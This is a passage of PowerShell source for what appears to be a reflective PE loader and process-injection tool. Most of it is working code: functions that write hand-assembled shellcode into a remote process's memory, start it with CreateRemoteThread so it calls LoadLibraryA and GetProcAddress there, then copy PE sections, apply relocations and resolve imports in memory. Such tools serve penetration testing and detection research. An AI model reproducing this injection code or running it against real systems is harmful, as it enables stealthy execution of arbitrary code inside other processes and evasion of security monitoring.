            elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) {
                $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
            }
            else {
                Throw 'PE file is not an EXE or DLL'
            }
        
            return $PEInfo
        }
    
    
        Function Import-DllInRemoteProcess {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $RemoteProcHandle,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $ImportDllPathPtr
            )
        
            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
            $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
            $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
            $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RImportDllPathPtr -eq [IntPtr]::Zero) {
                Throw 'Unable to allocate memory in the remote process'
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
            if ($Success -eq $false) {
                Throw 'Unable to write DLL path to remote process memory'
            }
            if ($DllPathSize -ne $NumBytesWritten) {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke('kernel32.dll')
            $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, 'LoadLibraryA') #Kernel32 loaded to the same address for all processes
        
            [IntPtr]$DllAddress = [IntPtr]::Zero
            #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
            #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
            if ($PEInfo.PE64Bit -eq $true) {
                #Allocate memory for the address returned by LoadLibraryA
                $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                if ($LoadLibraryARetMem -eq [IntPtr]::Zero) {
                    Throw 'Unable to allocate memory in the remote process for the return value of LoadLibraryA'
                }
            
            
                #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
                $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
                $LoadLibrarySC2 = @(0x48, 0xba)
                $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
                $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
                $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
            
                Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero) {
                    Throw 'Unable to allocate memory in the remote process for shellcode'
                }
            
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
                    Throw 'Unable to write shellcode to remote process memory.'
                }
            
                $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0) {
                    Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
                }
            
                #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
                [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
                if ($Result -eq $false) {
                    Throw 'Call to ReadProcessMemory failed'
                }
                [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
            else {
                [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0) {
                    Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
                }
            
                [Int32]$ExitCode = 0
                $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
                if (($Result -eq 0) -or ($ExitCode -eq 0)) {
                    Throw 'Call to GetExitCodeThread failed'
                }
            
                [IntPtr]$DllAddress = [IntPtr]$ExitCode
            }
        
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
            return $DllAddress
        }
    
    
        Function Get-RemoteProcAddress {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $RemoteProcHandle,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $RemoteDllHandle,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [String]
                $FunctionName
            )

            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
            $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        
            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero) {
                Throw 'Unable to allocate memory in the remote process'
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
            if ($Success -eq $false) {
                Throw 'Unable to write DLL path to remote process memory'
            }
            if ($FunctionNameSize -ne $NumBytesWritten) {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        
            #Get address of GetProcAddress
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke('kernel32.dll')
            $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, 'GetProcAddress') #Kernel32 loaded to the same address for all processes

        
            #Allocate memory for the address returned by GetProcAddress
            $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($GetProcAddressRetMem -eq [IntPtr]::Zero) {
                Throw 'Unable to allocate memory in the remote process for the return value of GetProcAddress'
            }
        
        
            #Write Shellcode to the remote process which will call GetProcAddress
            #Shellcode: GetProcAddress.asm
            #todo: need to have detection for when to get by ordinal
            [Byte[]]$GetProcAddressSC = @()
            if ($PEInfo.PE64Bit -eq $true) {
                $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
                $GetProcAddressSC2 = @(0x48, 0xba)
                $GetProcAddressSC3 = @(0x48, 0xb8)
                $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
                $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            }
            else {
                $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
                $GetProcAddressSC2 = @(0xb9)
                $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
                $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
                $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
            }
            $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
        
            Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero) {
                Throw 'Unable to allocate memory in the remote process for shellcode'
            }
        
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
                Throw 'Unable to write shellcode to remote process memory.'
            }
        
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0) {
                Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
            }
        
            #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if (($Result -eq $false) -or ($NumBytesWritten -eq 0)) {
                Throw 'Call to ReadProcessMemory failed'
            }
            [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
            return $ProcAddress
        }


        Function Copy-Sections {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $PEBytes,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $PEInfo,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Functions,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $Win32Types
            )
        
            for ( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
                $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
                #Address to copy the section to
                [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
                #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
                #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
                #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
                #    so truncate SizeOfRawData to VirtualSize
                $SizeOfRawData = $SectionHeader.SizeOfRawData

                if ($SectionHeader.PointerToRawData -eq 0) {
                    $SizeOfRawData = 0
                }
            
                if ($SizeOfRawData -gt $SectionHeader.VirtualSize) {
                    $SizeOfRawData = $SectionHeader.VirtualSize
                }
            
                if ($SizeOfRawData -gt 0) {
                    Test-MemoryRangeValid -DebugString 'Copy-Sections::MarshalCopy' -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
                }
        
                #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
                if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize) {
                    $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                    [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                    Test-MemoryRangeValid -DebugString 'Copy-Sections::Memset' -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                    $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
                }
            }
        }


        Function Update-MemoryAddresses {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $PEInfo,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $OriginalImageBase,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Constants,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $Win32Types
            )
        
            [Int64]$BaseDifference = 0
            $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
            [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
            #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
            if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                    -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0)) {
                return
            }


            elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true) {
                $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
                $AddDifference = $false
            }
            elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true) {
                $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
            }
        
            #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
            [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
            while ($true) {
                #If SizeOfBlock == 0, we are done
                $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

                if ($BaseRelocationTable.SizeOfBlock -eq 0) {
                    break
                }

                [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
                $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

                #Loop through each relocation
                for ($i = 0; $i -lt $NumRelocations; $i++) {
                    #Get info for this relocation
                    $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                    [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                    #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                    [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                    [UInt16]$RelocType = $RelocationInfo -band 0xF000
                    for ($j = 0; $j -lt 12; $j++) {
                        $RelocType = [Math]::Floor($RelocType / 2)
                    }

                    #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                    #This appears to be true for EXE's as well.
                    #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                    if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                            -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64)) {           
                        #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                        [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                        [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                        if ($AddDifference -eq $true) {
                            [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                        }
                        else {
                            [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                        }               

                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                    }
                    elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE) {
                        #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                        Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                    }
                }
            
                $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
            }
        }


        Function Import-DllImports {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $PEInfo,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Functions,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Types,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $Win32Constants,
        
                [Parameter(Position = 4, Mandatory = $false)]
                [IntPtr]
                $RemoteProcHandle
            )
        
            $RemoteLoading = $false
            if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle) {
                $RemoteLoading = $true
            }
        
            if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
                [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
                while ($true) {
                    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                    #If the structure is null, it signals that this is the end of the array
                    if ($ImportDescriptor.Characteristics -eq 0 `
                            -and $ImportDescriptor.FirstThunk -eq 0 `
                            -and $ImportDescriptor.ForwarderChain -eq 0 `
                            -and $ImportDescriptor.Name -eq 0 `
                            -and $ImportDescriptor.TimeDateStamp -eq 0) {
                        Write-Verbose 'Done importing DLL imports'
                        break
                    }

                    $ImportDllHandle = [IntPtr]::Zero
                    $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                    if ($RemoteLoading -eq $true) {
                        $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                    }
                    else {
                        $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                    }

                    if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero)) {
                        throw "Error importing DLL, DLLName: $ImportDllPath"
                    }
                
                    #Get the first thunk, then loop through all of them
                    [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                    while ($OriginalThunkRefVal -ne [IntPtr]::Zero) {
                        $ProcedureName = ''
                        #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                        #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                        #   and doing the comparison, just see if it is less than 0
                        [IntPtr]$NewThunkRef = [IntPtr]::Zero
                        if ([Int64]$OriginalThunkRefVal -lt 0) {
                            $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        }
                        else {
                            [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                            $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                            $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        }
                    
                        if ($RemoteLoading -eq $true) {
                            [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
                        }
                        else {
                            if ($ProcedureName -is [string]) {
                                [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
                            }
                            else {
                                [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
                            }
                        }
                    
                        if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero) {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }

                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                        $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                        [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                        [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                    }
                
                    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
                }
            }
        }

        Function Get-VirtualProtectValue {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt32]
                $SectionCharacteristics
            )
        
            $ProtectionFlag = 0x0
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0) {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0) {
                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                    }
                    else {
                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                    }
                }
                else {
                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                    }
                    else {
                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                    }
                }
            }
            else {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0) {
                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                        $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                    }
                    else {
                        $ProtectionFlag = $Win32Constants.PAGE_READONLY
                    }
                }
                else {
                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                        $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                    }
                    else {
                        $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                    }
                }
            }
        
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0) {
                $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
            }
        
            return $ProtectionFlag
        }

        Function Update-MemoryProtectionFlags {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $PEInfo,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Functions,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Constants,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
